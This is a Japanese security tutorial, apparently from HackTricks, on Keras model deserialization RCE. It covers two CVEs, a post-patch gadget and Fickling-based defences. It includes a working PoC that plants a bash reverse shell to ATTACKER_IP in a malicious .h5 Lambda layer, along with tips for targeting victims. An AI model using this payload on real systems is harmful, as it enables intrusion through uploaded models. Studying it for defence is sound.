# KerasモデルデシリアライゼーションRCEとガジェットハンティング

{{#include ../banners/hacktricks-training.md}}

このページでは、Kerasモデルのデシリアライゼーションパイプラインに対する実践的なexploit手法をまとめ、ネイティブの.keras形式の内部構造と攻撃対象領域を解説します。また、Model File Vulnerabilities（MFV）や修正後に利用可能なガジェットを見つけるためのリサーチツールキットも紹介します。

## .kerasモデル形式の内部構造

.kerasファイルは、少なくとも次の内容を含むZIPアーカイブです。<sup>[[1]](#references)</sup>
- metadata.json – 一般情報（例：Kerasのバージョン）
- config.json – モデルアーキテクチャ（主な攻撃対象領域）
- model.weights.h5 – HDF5形式の重み

config.jsonによって再帰的なデシリアライゼーションが実行されます。Kerasはモジュールをインポートし、クラスや関数を解決して、攻撃者が制御する辞書からレイヤーやオブジェクトを再構築します。<sup>[[1]](#references)</sup>

Denseレイヤーオブジェクトの例：

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

デシリアライズでは以下が実行されます。<sup>[[1]](#references)</sup>
- module/class_nameキーからのモジュールのインポートとシンボル解決
- 攻撃者が制御するkwargsを使ったfrom_config(...)またはコンストラクターの呼び出し
- ネストされたオブジェクト（activations、initializers、constraintsなど）の再帰的な処理

歴史的に、config.jsonを作成する攻撃者には次の3つのプリミティブが提供されていました。<sup>[[1]](#references)</sup>
- インポートするモジュールの制御
- 解決するクラス/関数の制御
- コンストラクター/from_configに渡すkwargsの制御

## CVE-2024-3660 – LambdaレイヤーのバイトコードRCE

根本原因:
- レガシーLambdaデシリアライズでは、攻撃者が制御するmarshal形式のコードからPython関数を再構築していました。`func_load()`はペイロードをbase64デコードし、`marshal.loads()`を呼び出して`FunctionType`を作成します。結果として得られる関数はLambdaの呼び出し時にバイトコードを実行します。また、影響を受けるpre-2.13のローダーは、レガシー形式に対するsafe-modeチェックを実施していませんでした。<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

ネイティブKeras v3アーカイブでは、Lambda関数は`__lambda__`オブジェクトとして表され、その`code`フィールドにはbase64エンコードされたmarshal形式のコードが格納されます。<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

緩和策:
- Keras はネイティブの Keras v3 形式では、デフォルトで `safe_mode=True` を適用します。`Lambda` 内のシリアライズされた Python lambda は、ユーザーが明示的に `safe_mode=False` を指定しない限りブロックされます。ただし、この保護はレガシー形式には同じようには適用されません。<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

注意:
- レガシー形式（古い HDF5 保存形式）や古いコードベースでは、最新のチェックが適用されない場合があります。そのため、被害者が古いローダーを使用している場合、「ダウングレード」型の攻撃が依然として有効なことがあります。

## CVE-2025-1550 – Keras 3.0.0～3.8.x における任意のモジュールインポート

根本原因:
- `_retrieve_class_or_fn` は、`config.json` 内の攻撃者が制御するモジュール文字列に対して `importlib.import_module(module)` を使用していました。
- 影響: 細工された `.keras` アーカイブにより、`safe_mode=True` であっても `Model.load_model()` に攻撃者が選択した Python モジュールや関数をインポートさせ、インポート時の副作用を発生させたり、攻撃者が制御する引数を渡したりできます。<sup>[[1]](#references)[[4]](#references)</sup>

エクスプロイトのアイデア:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

セキュリティの改善（Keras ≥ 3.9）：<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: インポートは公式エコシステムのモジュールに制限されます: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True により、安全でない Lambda のシリアライズ済み関数の読み込みがブロックされます
- 基本的な型チェック: デシリアライズされたオブジェクトは、期待される型と一致する必要があります

## 実践的な悪用: TensorFlow-Keras HDF5 (.h5) Lambda RCE

レガシーな TensorFlow-Keras のデプロイ環境では、今も HDF5 モデルファイル（`.h5`）を受け入れる場合があります。攻撃者が、サーバーが後で読み込む、または推論を実行するモデルをアップロードできる場合、影響を受けるローダーは、攻撃者が制御する Python を含む Lambda レイヤーをデシリアライズし、アプリケーションのモデル処理ワークフロー内で実行する可能性があります。<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

ターゲットがモデルを呼び出した際に Lambda が reverse shell を実行する、悪意のある .h5 を作成するための最小限の PoC:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Notes and reliability tips:
- トリガーポイントはフォーマットやワークフローによって異なります。参照先のwrite-upでは、prediction中にpayloadが2回実行されることが確認されています。副作用は繰り返し発生するものとして扱い、payloadは冪等にしてください。<sup>[[7]](#references)</sup>
- Version pinning: シリアライズの不一致を避けるため、被害者のTF/Keras/Pythonのバージョンに合わせてください。たとえば、ターゲットがPython 3.8とTensorFlow 2.13.1を使用している場合は、その環境でartifactをビルドします。<sup>[[7]](#references)</sup>
- 環境をすばやく再現する方法:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validation: `os.system("ping -c 1 YOUR_IP")`のような無害なpayloadを使うと、reverse shellに切り替える前に実行を確認できます（例: tcpdumpでICMPを観測）。<sup>[[7]](#references)</sup>

## 修正後のallowlist内のgadget surface

Kerasのmodule allowlistとsafe modeを使っていても、許可されたcallableが副作用を引き起こす可能性があります。たとえば、`keras.utils.get_file`はURLをダウンロードし、設定されたcache locationに書き込むため、gadget分析の候補になります。<sup>[[1]](#references)[[19]](#references)</sup>

候補となるLambda設定（制御されたテストでcall signatureを検証してください）:

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Important limitation:
- `Lambda.call()` は常にモデル入力を最初の位置引数として渡し、設定された `arguments` をキーワード引数として渡します。`get_file` では、その位置引数の値が `fname` に割り当てられます。tensor と path の型が一致しないと、ダウンロード前にこの候補は失敗する可能性があるため、確実に動作する gadget ではありません。<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML models 向け ML pickle import allowlisting (Fickling)

多くの AI/ML model format (PyTorch `.pt`/`.pth`/`.ckpt`、joblib/scikit-learn artifacts、その他の Python-native formats) には、Python pickle data が埋め込まれています。前述の legacy Keras Lambda path は代わりに marshaled function bytecode を使用するため、別個の deserialization risk です。pickle opcode は deserialization 中に攻撃者が制御する動作を呼び出す可能性があり、model tampering や RCE を引き起こすことがあります。また、単純な scanner は新しい、またはリストにない危険な import を見逃すことがあります。<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

実用的な fail-closed 防御策は、Python の pickle deserializer にフックを設定し、unpickling 中にレビュー済みの無害な ML 関連 import だけを許可することです。Trail of Bits の Fickling はこのポリシーを実装し、公開されている数千件の Hugging Face pickle をもとに作成した、厳選済みの ML import allowlist を備えています。<sup>[[8]](#references)[[13]](#references)</sup>

「safe」な import のセキュリティモデル (研究と実践から導き出した直感的な指針): pickle が使用する import symbol は、次のすべてを同時に満たす必要があります。<sup>[[8]](#references)</sup>
- コードを実行せず、実行を引き起こさない (compiled/source code objects、shell コマンドの実行、hook などを含まない)
- 任意の attribute や item を取得・設定しない
- pickle VM から他の Python object を import したり、その参照を取得したりしない
- 二次 deserializer (例: marshal、ネストされた pickle) を、間接的な場合も含めて起動しない

プロセスの起動時にできるだけ早く Fickling の保護を有効にし、framework による pickle の読み込み (`torch.load`、`joblib.load` など) がすべてチェックされるようにします。<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

運用上のヒント:
- 必要に応じてフックを一時的に無効化／再有効化できます:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- 既知の正常なモデルがブロックされた場合は、シンボルを確認したうえで、環境の許可リストを拡張してください。<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling では、より細かな制御を行いたい場合に使える汎用ランタイムガードも提供しています:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() ですべての pickle.load() に対するチェックを強制
  - with fickling.check_safety(): でスコープを限定して強制
  - fickling.load(path) / fickling.is_likely_safe(path) で個別にチェック

- 可能な場合は、pickle 以外のモデル形式（SafeTensors など）を優先してください。<sup>[[15]](#references)</sup> pickle を受け入れる必要がある場合は、最小権限でネットワークへの送信を遮断した環境でローダーを実行し、allowlist を適用してください。

この allowlist-first 戦略は、互換性を高く保ちながら、一般的な ML pickle のエクスプロイト経路を確実に遮断します。ToB のベンチマークでは、Fickling は合成した悪意あるファイルを100%検出し、Hugging Face の主要リポジトリにあるクリーンなファイルの約99%を許可しました。<sup>[[8]](#references)[[10]](#references)</sup>


## 研究者向けツールキット

1) 許可されたモジュール内の gadget を体系的に発見する

keras、keras_nlp、keras_cv、keras_hub 全体で候補となる呼び出し可能オブジェクトを列挙し、ファイル、ネットワーク、プロセス、環境に副作用を及ぼすものを優先します。<sup>[[1]](#references)</sup>

<details>
<summary>allowlist に登録された Keras モジュール内で、危険性のある呼び出し可能オブジェクトを列挙する</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) 直接デシリアライズのテスト（.keras アーカイブ不要）

細工した dict を Keras deserializer に直接渡し、受け入れられるパラメータを調べ、副作用を観察します。<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) バージョン間の検証とフォーマット

Kerasには、異なるガードレールやフォーマットを持つ複数のコードベース／世代があります:<sup>[[1]](#references)</sup>
- TensorFlow組み込みKeras: tensorflow/python/keras（レガシー、削除予定）
- tf-keras: 個別にメンテナンス
- マルチバックエンドのKeras 3（公式）: ネイティブの.kerasを導入

コードベースとフォーマット（.kerasとレガシーHDF5）をまたいでテストを繰り返し、リグレッションやガードの欠落を見つけましょう。

## References

- [1] [Kerasモデルのデシリアライズにおける脆弱性の調査（huntrブログ）](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – シリアライズにチェックを追加](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras LambdaのデシリアライズによるRCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Kerasの任意モジュールインポート（≤ 3.8）](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntrレポート – 任意インポート #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntrレポート – 任意インポート #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5のLambdaによるRCEからroot権限取得](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bitsブログ – Ficklingの新しいAI/ML pickleファイルスキャナー](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML環境のセキュリティ保護（README）](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickleスキャンのベンチマークコーパス](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle攻撃の背景](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensorsプロジェクト](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2のLambdaレイヤーで任意コードインジェクションが可能](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambdaレイヤーのソース（v3.10.0）](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Pythonユーティリティのソース（v3.10.0）](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../banners/hacktricks-training.md}}
